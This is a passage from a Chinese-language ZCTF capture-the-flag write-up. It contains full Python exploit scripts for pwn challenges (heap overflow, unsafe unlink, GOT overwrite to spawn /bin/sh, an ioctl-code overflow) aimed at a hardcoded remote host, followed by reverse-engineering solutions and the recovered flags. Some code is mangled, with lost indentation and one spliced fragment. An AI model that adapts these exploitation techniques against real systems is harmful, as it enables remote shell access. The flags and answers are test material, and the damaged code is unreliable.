    def pwn(io):
    name_addr = 0x6020E0
    address_addr = 0x602180
    address = 'aaa'
    name  = l64(0x20) + l64(0x21)
    name = name.ljust(0x20, 'a')
    name += l64(0x20) + l64(0x21)
    name += l64(0x0)
    io.read_until("Input your name:n")
    io.writeline(name)
    io.read_until("Input your address:n")
    io.writeline(address)
    new_note(io, 0, '')
    new_note(io, 0x80, '')
    atoi_got = 0x0000000000602088
    manage_addr = 0x602120
    payload = 'a' * 0x10
    for i in range(7):
    edit_note(io, 0, 2, payload)
    payload = 'a' * 0xf
    edit_note(io, 0, 2, payload)
    payload = 'a' + l64(name_addr + 0x10)
    edit_note(io, 0, 2, payload)
    io.gdb_hint()
    new_note(io, 0, '')
    payload = 'a' * 0x10
    for i in range(2):
    edit_note(io, 2, 2, payload)
    payload = 'a' * 0xf
    edit_note(io, 2, 2, payload)
    payload = 'a' + l64(atoi_got)
    edit_note(io, 2, 2, payload)
    show_note(io, 0)
    io.read_until('Content is ')
    data = io.read_until("n")[:-1]
    print [c for c in data]
    data = data.ljust(8, 'x00')
    aoti_addr = l64(data)
    print "aoti_addr:", hex(aoti_addr)
    elf_info = ELF("./libc-2.19.so")
    #elf_info = ELF("./libc.so.6")
    atoi_offset = elf_info.symbols["atoi"]
    system_offset = elf_info.symbols["system"]
    libc_base = aoti_addr - atoi_offset
    system_addr = libc_base + system_offset
    content = l64(system_addr)
    print "system_addr:", hex(system_addr)
    edit_note(io, 0, 1, content)
    io.read_until("option--->>n")
    io.writeline("/bin/sh")
    io.interact()
    io = get_io(target)
    pwn(io)
结果
flag: ZCTF{C0ngr@tu1@tIoN_tewre0_PwN_8ug_19390#@!}
spell(pwn300):
这道题的逻辑还是比较简单的,读取用户数据,然后与从驱动中读到的数据进行对比,符合要求,则打印flag。
看驱动代码,发现有两个ioctl指令:
0x80086B01 –> 返回8字节随机数
0x80086B02 –> 返回时间字符串
如下:
而时间在最初的时候会打印一次,但是这里只是精确到分钟。
对于用户输入的串,与驱动进行比较时,会有多轮次,长度符合规律,现将长度求出得56,每8字节为一组,与驱动中读出的数据进行异或,如果每次异或结果都为’zctfflag’,则成功。
问题所在:
读取用户输入的时候,会读取len+2的长度,而且将len+1的位置置为’n’,那么此时如果输入长度刚好为256,可以读取258个字节
而在cpy函数中,赋值结束时按照’n’来定的,所以可以赋值257个字节,如下:
而dest_buff缓冲区只有256个字节,其后跟着v13,它为第二次获取驱动中数据函数ioctl的指令代码,如下:
所以可以覆盖其最低字节,那么此时如果将最后一字节其覆盖成0x02,则获取的结果就是8字节的时间,而时间是8字节的,而且是以分钟为精度的,所以可以将第一次的时间近似看成第二次的时间,从而构造合适的输入数据。
利用代码如下:
    __author__ = "pxx"
    from zio import *
    target = ("115.28.27.103", 33333)
    def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    #io = process(target, timeout = 9999)
    return  io
    def pwn(io):
    io.read_until("How long of your spell:")
    io.writeline("256")
    io.read_until("At ")
    time_info = io.read_until(": ")
    io.read_until("you enter the spell: ")
    time_info = time_info + "x00"
    info = "zctfflag"
    result = []
    padding = ""
    for i in range(8):
    padding += chr(ord(time_info[i]) ^ ord(info[i]))
    payload = padding * 7
    payload += "x00"
    payload = payload.ljust(256, 'a')
    payload += 'x02'
    io.writeline(payload)
    io.interact()
    io = get_io(target)
    pwn(io)
结果:
flag: ZCTF{SPELL_IS_IN_THE_D33wRIVER}
note3(pwn300):
该题是note系列第三个,问题依然在edit中,如下图:
其中输入的id经过一些列运算,其中get_long函数中,转换是atol,而发行len>n")
    io.writeline("1")
    io.read_until("content:(less than 1024)n")
    io.writeline(str(length_t))
    io.read_until("content:n")
    io.writeline(content_t)
    def delete_note(io, id_t):
    io.read_until("option--->>n")
    io.writeline("4")
    io.read_until("id of the note:n")
    io.writeline(str(id_t))
    def edit_note(io, id_t, content_t):
    io.read_until("option--->>n")
    io.writeline("3")
    io.read_until("id of the note:n")
    io.writeline(str(id_t))
    io.read_until("content:")
    io.writeline(content_t)
    def pwn(io):
    new_note(io, 0x80, 'aaaaaa')
    new_note(io, 0x80, 'bbbbbb')
    new_note(io, 0x80, 'cccccc')
    new_note(io, 0x80, 'dddddd')
    new_note(io, 0x80, 'eeeeee')
    new_note(io, 0x80, 'ffffff')
    new_note(io, 0x80, '/bin/sh;')
    target_id = 2
    edit_note(io, target_id, '111111')
    #useful_code --- begin
    #prepare args
    arch_bytes = 8
    heap_buff_size = 0x80
    #node1_addr = &p0
    node1_addr = 0x6020C8 + 0x08 * target_id
    pack_fun = l64
    heap_node_size = heap_buff_size + 2 * arch_bytes #0x88
    p0 = pack_fun(0x0)
    p1 = pack_fun(heap_buff_size + 0x01)
    p2 = pack_fun(node1_addr - 3 * arch_bytes)
    p3 = pack_fun(node1_addr - 2 * arch_bytes)
    #p[2]=p-3
    #p[3]=p-2
    #node1_addr = &node1_addr - 3
    node2_pre_size = pack_fun(heap_buff_size)
    node2_size = pack_fun(heap_node_size)
    data1 = p0 + p1 + p2 + p3 + "".ljust(heap_buff_size - 4 * arch_bytes, '1') + node2_pre_size + node2_size
    #useful_code --- end
    #edit node 1:overwrite node 1 -> overflow node 2
    edit_note(io, -9223372036854775808, data1)
    #edit_note(io, 1, score, data1)
    #delete node 2, unlink node 1 -> unlink
    #delete_a_restaurant(io, 2)
    delete_note(io, target_id + 1)
    alarm_got = 0x0000000000602038
    puts_plt = 0x0000000000400730
    free_got = 0x0000000000602018
    data1 = l64(0x0) + l64(alarm_got) + l64(free_got) + l64(free_got)
    edit_note(io, target_id, data1)
    data1 = l64(puts_plt)[:6]
    io.gdb_hint()
    edit_note(io, target_id, data1)
    #io.read_until("option--->>n")
    #io.writeline("3")
    #io.read_until("id of the note:n")
    #io.writeline(l64(atol_got))
    #data = io.read_until("n")
    #print [c for c in data]
    delete_note(io, 0)
    data = io.read_until("n")[:-1]
    print [c for c in data]
    alarm_addr = l64(data.ljust(8, 'x00'))
    print "alarm_addr:", hex(alarm_addr)
    elf_info = ELF("./libc-2.19.so")
    #elf_info = ELF("./libc.so.6")
    alarm_offset = elf_info.symbols["alarm"]
    system_offset = elf_info.symbols["system"]
    libc_base = alarm_addr - alarm_offset
    system_addr = libc_base + system_offset
    data = l64(system_addr)[:6]
    edit_note(io, 1, data)
    delete_note(io, 6)
    io.interact()
    io = get_io(target)
    pwn(io)
结果:
flag: ZCTF{No_s1-1Ow_n0dfs_1eak!@#}
**REVERSE**
Reverese100
这个题最开始是个矩阵运行,算了半天算出来flag为zctf{Wrong_Flag},明显不对。继续往后分析,真正的代码在后面。
    value = '32 02 00 00 85 02 00 00 F4 02 00 00 53 03 00 00 98 03 00 00 F9 03 00 00 6C 04 00 00 E5 04 00 00 44 05 00 00 93 05 00 00 FB 05 00 00 5A 06 00 00 A1 06 00 00 10 07 00 00 74 07 00 00 F1 07 00 00'
    d = ''
    for l in value.split(' '):
        d += chr(int(l, 16))
    print len(d)
    from zio import *
    d2 = []
    d0 = ord('z')+ord('c')+ord('t')+ord('f')
    d2.append(d0)
    for i in range(len(d)/4):
        d2.append(l32(d[i*4:i*4+4]))
    flag = ''
    for i in range(len(d2)-1):
        flag += chr(d2[i+1]-d2[i])
    print 'zctf'+flag
    Reverse200
    Flag形式如下:ZCTF{123_4567_abc_defghijklm}
    其中123对应的md5为371265e33e8d751d93b148067c36eb4c,对应的3的字符为c0c
    4567处对应的4个字符+一个’x00’的md5为'03d2370991fbbb9101dd7dcf4b03d619',求得4567处对应LIK3.
    md5str = '03d2370991fbbb9101dd7dcf4b03d619'
    for a1 in range(0x20, 0x7f):
        for a2 in range(0x20, 0x7f):
            for a3 in range(0x20, 0x7f):
                for a4 in range(0x20, 0x7f):